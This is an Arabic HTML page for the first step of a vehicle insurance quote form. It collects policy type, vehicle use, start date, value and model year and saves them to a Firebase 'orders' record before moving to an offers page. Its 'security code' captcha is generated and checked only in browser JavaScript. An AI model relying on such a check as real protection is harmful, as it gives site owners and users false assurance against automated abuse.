<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفاصيل التأمين والمركبة</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <style>
        body { background-color: #e8f5e9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .form-wrapper {
            max-width: 800px;
            margin: 30px auto;
            padding: 30px;
            background: #ffffff;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            border-top: 5px solid #198754;
        }
        /* شريط الخطوات */
        .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; color: #6c757d; font-size: 0.9rem; }
        .step { text-align: center; flex: 1; position: relative; }
        .step.active { color: #198754; font-weight: bold; }
        .step-icon { width: 40px; height: 40px; background-color: #fff; border: 2px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; font-size: 1.1rem; }
        .step.active .step-icon { border-color: #198754; background-color: #198754; color: #fff; }
        
        /* تنسيق الحقول */
        .form-label { font-weight: 600; color: #2c3e50; margin-bottom: 8px; }
        .form-control, .form-select { padding: 12px; border-radius: 8px; border: 1px solid #ced4da; }
        .form-control:focus, .form-select:focus { border-color: #198754; box-shadow: 0 0 0 0.25rem rgba(25, 135, 84, 0.15); }
        
        /* الكابتشا */
        .captcha-box {
            background-color: #f8f9fa;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            letter-spacing: 8px;
            font-size: 1.8rem;
            color: #198754;
            border: 2px dashed #198754;
            border-radius: 8px;
            user-select: none;
            font-family: 'Courier New', Courier, monospace;
        }
        
        /* كروت الراديو */
        .radio-card { border: 1px solid #dee2e6; border-radius: 8px; padding: 15px; transition: 0.2s; cursor: pointer; }
        .radio-card:hover { background-color: #f8f9fa; }
        .form-check-input:checked + .form-check-label .radio-card { border-color: #198754; background-color: #e8f5e9; color: #198754; }
        .form-check-input { display: none; } /* إخفاء الدائرة الافتراضية */
    </style>
</head>
<body>

<div class="container">
    <div class="form-wrapper">
        
        <!-- شريط الخطوات -->
        <div class="step-indicator">
            <div class="step active"><div class="step-icon">1</div><div>البيانات</div></div>
            <div class="step"><div class="step-icon">2</div><div>العروض</div></div>
            <div class="step"><div class="step-icon">3</div><div>الدفع</div></div>
        </div>

        <h3 class="text-center mb-4 text-success fw-bold">بيانات الوثيقة والمركبة</h3>

        <form id="insuranceForm">
            
            <!-- نوع التأمين -->
            <div class="row mb-4">
                <label class="form-label">نوع التأمين المطلوب</label>
                <div class="col-6">
                    <input type="radio" class="form-check-input" name="insType" id="typeTPL" value="tpl" checked>
                    <label class="form-check-label w-100" for="typeTPL"><div class="radio-card text-center fw-bold">🛡️ ضد الغير</div></label>
                </div>
                <div class="col-6">
                    <input type="radio" class="form-check-input" name="insType" id="typeComp" value="comp">
                    <label class="form-check-label w-100" for="typeComp"><div class="radio-card text-center fw-bold">💎 شامل</div></label>
                </div>
            </div>

            <div class="row g-3 mb-3">
                <!-- الغرض من الاستخدام -->
                <div class="col-md-6">
                    <label for="usage" class="form-label">الغرض من استخدام المركبة</label>
                    <select class="form-select" id="usage" required>
                        <option value="" selected disabled>-- اختر الغرض --</option>
                        <option value="personal">استخدام شخصي</option>
                        <option value="commercial">تجاري</option>
                        <option value="rent">تأجير</option>
                        <option value="passenger">نقل ركاب</option>
                        <option value="ride_hailing">كريم أو أوبر</option>
                        <option value="goods">نقل بضائع</option>
                        <option value="oil">نقل مشتقات نفطية</option>
                    </select>
                </div>

                <!-- تاريخ بدء الوثيقة -->
                <div class="col-md-6">
                    <label for="startDate" class="form-label">تاريخ بدء الوثيقة</label>
                    <input type="date" class="form-control" id="startDate" required>
                </div>

                <!-- القيمة التقديرية -->
                <div class="col-md-6">
                    <label for="carValue" class="form-label">القيمة التقديرية (ريال)</label>
                    <input type="number" class="form-control" id="carValue" placeholder="مثال: 45000" required>
                </div>

                <!-- سنة الصنع -->
                <div class="col-md-6">
                    <label for="carYear" class="form-label">سنة الصنع</label>
                    <input type="number" class="form-control" id="carYear" placeholder="مثال: 2023" min="1980" max="2026" required>
                </div>
            </div>

            <!-- الكابتشا -->
            <div class="mb-4 mt-4">
                <label class="form-label">رمز التحقق الأمني</label>
                <div class="captcha-box mb-2" id="captchaDisplay" style="cursor: pointer;" title="اضغط لتغيير الرمز">Waiting...</div>
                <input type="text" class="form-control text-center" id="captchaInput" placeholder="أدخل الرمز الظاهر أعلاه" style="letter-spacing: 3px; font-weight: bold;" required>
                <div id="captchaError" class="text-danger small mt-1" style="display: none;">❌ الرمز غير صحيح، حاول مرة أخرى</div>
            </div>

            <div class="d-grid">
                <button type="submit" class="btn btn-success btn-lg py-3 fw-bold">عرض الأسعار 🚀</button>
            </div>
        </form>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const userId = localStorage.getItem('user_id');

    // 1. نظام الكابتشا
    let generatedCaptcha = "";
    const captchaDisplay = document.getElementById('captchaDisplay');
    
    function refreshCaptcha() {
        const chars = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ";
        let result = "";
        for (let i = 0; i < 4; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
        generatedCaptcha = result;
        captchaDisplay.innerText = result;
        document.getElementById('captchaError').style.display = 'none';
    }
    captchaDisplay.addEventListener('click', refreshCaptcha);
    refreshCaptcha();

    // 2. معالجة النموذج
    document.getElementById('insuranceForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const userCaptcha = document.getElementById('captchaInput').value.toUpperCase().trim();
        if (userCaptcha !== generatedCaptcha) {
            document.getElementById('captchaError').style.display = 'block';
            refreshCaptcha();
            document.getElementById('captchaInput').value = "";
            return;
        }

        if (userId) {
            await updateDoc(doc(db, "orders", userId), {
                insurance_type: document.querySelector('input[name="insType"]:checked').value,
                usage_purpose: document.getElementById('usage').value,
                start_date: document.getElementById('startDate').value,
                car_value: document.getElementById('carValue').value,
                car_year: document.getElementById('carYear').value,
                status: "تم تعبئة البيانات - بانتظار العروض"
            }).catch((err) => console.error("Error updating document:", err));
        }
        window.location.href = "offers.html";
    });
</script>
</body>
</html>
